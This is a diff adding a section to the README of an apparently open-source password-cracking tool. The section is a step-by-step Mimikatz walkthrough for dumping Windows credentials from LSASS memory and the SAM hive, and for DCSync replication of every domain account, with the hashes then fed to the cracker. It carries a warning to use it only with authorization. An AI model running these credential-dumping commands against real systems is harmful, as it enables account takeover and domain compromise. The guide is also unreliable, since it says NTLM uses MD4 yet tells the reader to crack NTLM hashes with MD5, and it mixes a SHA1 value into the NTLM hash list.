@@ -176,6 +176,102 @@ password-guesser crack-wifi \
 
 WiFi mode requires `aircrack-ng` or `hashcat` to be installed. Minimum password length defaults to 8 (WPA requirement).
 
+### 6. Dump and crack Windows credentials with Mimikatz
+
+[Mimikatz](https://github.com/gentilkiwi/mimikatz) can extract password hashes from Windows systems during authorized penetration tests. The dumped NTLM hashes can then be cracked with password-guesser.
+
+> **Warning:** Mimikatz must only be used on systems you own or have explicit written authorization to test. Unauthorized credential dumping is illegal.
+
+**Step 1 — Download Mimikatz:**
+
+Download the latest release from the [official Mimikatz releases page](https://github.com/gentilkiwi/mimikatz/releases). Extract it on the target Windows machine.
+
+**Step 2 — Run Mimikatz as Administrator:**
+
+Open an elevated command prompt or PowerShell and launch Mimikatz:
+
+```
+mimikatz.exe
+```
+
+**Step 3 — Enable debug privileges:**
+
+```
+mimikatz # privilege::debug
+```
+
+You should see `Privilege '20' OK` confirming SeDebugPrivilege is enabled.
+
+**Step 4 — Dump credentials from LSASS memory:**
+
+```
+mimikatz # sekurlsa::logonpasswords
+```
+
+This dumps all cached credentials including NTLM hashes. Look for lines like:
+
+```
+* NTLM : 32ed87bdb5fdc5e9cba88547376818d4
+* SHA1  : a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
+```
+
+**Step 5 — (Alternative) Dump the SAM database:**
+
+To extract local account hashes from the SAM registry hive:
+
+```
+mimikatz # lsadump::sam
+```
+
+This outputs hashes in the format `User : RID : LM-hash : NTLM-hash`.
+
+**Step 6 — (Alternative) Dump from a domain controller (DCSync):**
+
+If you have domain admin privileges during an authorized assessment:
+
+```
+mimikatz # lsadump::dcsync /domain:corp.local /all /csv
+```
+
+This replicates password data from Active Directory without touching the domain controller's disk.
+
+**Step 7 — Save the hashes to a file:**
+
+Copy the NTLM hashes into a text file, one per line:
+
+```
+32ed87bdb5fdc5e9cba88547376818d4
+a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
+e99a18c428cb38d5f260853678922e03
+```
+
+**Step 8 — Crack with password-guesser:**
+
+NTLM hashes use the MD4 algorithm, but are commonly represented as straight hex digests similar to MD5. For NTLM hashes dumped via Mimikatz, use the MD5 or SHA1 algorithm matching the hash type shown in the Mimikatz output:
+
+```sh
+# Crack NTLM hashes (32-char hex from sekurlsa::logonpasswords)
+password-guesser crack-hash \
+  --hash-file ntlm_hashes.txt \
+  --algo md5 \
+  --profile target_profile.toml \
+  --depth 3
+
+# Crack SHA1 hashes if dumped as SHA1
+password-guesser crack-hash \
+  --hash-file sha1_hashes.txt \
+  --algo sha1 \
+  --profile target_profile.toml \
+  --depth 3
+```
+
+**Tips for better results:**
+
+- Build a detailed target profile with the user's known info (name, department, company name, etc.)
+- Use `--depth 3` for thorough coverage
+- Corporate passwords often follow patterns like `CompanyName2024!` or `Season+Year` — add these to the `[custom]` section of your profile
+- For large hash dumps, process them in batches or use the `--hash-file` flag
+
 ## How it works
 
 The generator builds candidates in tiers:
